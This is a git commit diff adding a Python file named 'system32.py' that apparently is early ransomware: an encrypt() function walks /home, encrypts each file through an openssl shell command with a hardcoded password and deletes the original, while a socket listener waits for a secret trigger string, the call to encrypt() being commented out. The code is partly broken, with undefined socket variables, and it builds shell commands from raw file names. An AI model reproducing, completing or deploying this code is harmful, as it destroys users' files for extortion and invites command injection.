e362756d9ff6bf7fa63246b553a39e7b1ce06a63
tsorrels <tyler.sorrels@gmail.com>
2018-09-27 19:02:37 -0700

    adding system32.py

--- system32.py
+++ system32.py
@@ -1,27 +1,27 @@
 import socket
+import os
 
-
-
-
-
-
-
+encrypt_string = 'openssl enc -aes-256-cbc -in {0} -out {1} -pass pass:password'
 
 def encrypt():
-    pass
-
-
+    
+    for subdir, dirs, files in os.walk('/home'):
+        for file_name in files: 
+            file_path = subdir + os.sep + file_name
+            cmd_string = encrypt_string.format(file_path, file_path + '.enc')
+            os.system(cmd_string)
+            os.remove(file_path)
+            
 
 def main():
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     serversocket.bind((socket.gethostname(), 54321))
-    sock.listen(3)
     while True:
-        (clientsocket, address) = sock.accept()
         data = clientsocket.recv()
+        print data
         if data == 'idru5991a:execute:encrypt5':
-            encrypt()
+            #encrypt()
             return
         
 
